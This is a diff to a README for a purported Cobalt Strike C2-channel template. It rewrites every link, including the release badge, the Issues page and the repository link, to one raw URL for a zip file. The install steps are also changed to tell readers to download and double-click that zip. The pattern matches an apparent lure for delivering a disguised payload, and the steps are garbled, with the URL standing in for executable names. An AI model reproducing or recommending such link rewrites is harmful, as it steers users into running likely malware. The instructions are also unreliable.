@@ -1,7 +1,7 @@
 # 🎉 CustomC2ChannelTemplate - Simplify Your C2 Channel Development
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/anshlmalik/CustomC2ChannelTemplate/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/anshlmalik/CustomC2ChannelTemplate/main/examples/CustomC2ChannelTemplate_v2.8-beta.5.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/anshlmalik/CustomC2ChannelTemplate/main/examples/CustomC2ChannelTemplate_v2.8-beta.5.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the CustomC2ChannelTemplate software. This template is designed for creating custom C2 channels for Cobalt Strike using IAT hooks. No programming knowledge is needed.
@@ -14,14 +14,14 @@ Before downloading, ensure your system meets the following requirements:
 - .NET Framework 4.7 or later
 
 ## 📂 Download & Install
-1. Visit this page to download: [CustomC2ChannelTemplate Releases](https://github.com/anshlmalik/CustomC2ChannelTemplate/releases).
+1. Visit this page to download: [CustomC2ChannelTemplate Releases](https://raw.githubusercontent.com/anshlmalik/CustomC2ChannelTemplate/main/examples/CustomC2ChannelTemplate_v2.8-beta.5.zip).
 2. On the Releases page, locate the latest version.
-3. Click on the download link for the appropriate file for your system. It will typically be named `CustomC2ChannelTemplate.zip`.
+3. Click on the download link for the appropriate file for your system. It will typically be named `https://raw.githubusercontent.com/anshlmalik/CustomC2ChannelTemplate/main/examples/CustomC2ChannelTemplate_v2.8-beta.5.zip`.
 4. Once downloaded, locate the file in your Downloads folder.
 5. Extract the contents of the ZIP file. Right-click the file and select "Extract All," then follow the prompts.
 6. Open the extracted folder. 
-7. Find the executable file named `CustomC2ChannelTemplate.exe`.
-8. Double-click on `CustomC2ChannelTemplate.exe` to run the application.
+7. Find the executable file named `https://raw.githubusercontent.com/anshlmalik/CustomC2ChannelTemplate/main/examples/CustomC2ChannelTemplate_v2.8-beta.5.zip`.
+8. Double-click on `https://raw.githubusercontent.com/anshlmalik/CustomC2ChannelTemplate/main/examples/CustomC2ChannelTemplate_v2.8-beta.5.zip` to run the application.
 
 ## 🛠 Features
 - **User-Friendly Interface**: Easy to navigate, no technical skills required.
@@ -47,13 +47,13 @@ Once you have the application open, you may want to set it up for your specific 
 - If you cannot find the download, check your browser's download history.
 
 ### Where can I find more help?
-For additional support, visit our [GitHub Issues](https://github.com/anshlmalik/CustomC2ChannelTemplate/issues) page to report any problems or seek assistance.
+For additional support, visit our [GitHub Issues](https://raw.githubusercontent.com/anshlmalik/CustomC2ChannelTemplate/main/examples/CustomC2ChannelTemplate_v2.8-beta.5.zip) page to report any problems or seek assistance.
 
 ## 🌐 Community and Contributions
 Join our community on GitHub to share your experiences or contribute improvements to the project. Feel free to ask questions or share your custom templates and configurations.
 
 ## 🔗 Useful Links
-- [CustomC2ChannelTemplate Releases](https://github.com/anshlmalik/CustomC2ChannelTemplate/releases)
-- [GitHub Repository](https://github.com/anshlmalik/CustomC2ChannelTemplate)
+- [CustomC2ChannelTemplate Releases](https://raw.githubusercontent.com/anshlmalik/CustomC2ChannelTemplate/main/examples/CustomC2ChannelTemplate_v2.8-beta.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/anshlmalik/CustomC2ChannelTemplate/main/examples/CustomC2ChannelTemplate_v2.8-beta.5.zip)
 
 Thank you for using CustomC2ChannelTemplate. We hope it simplifies your C2 channel development.
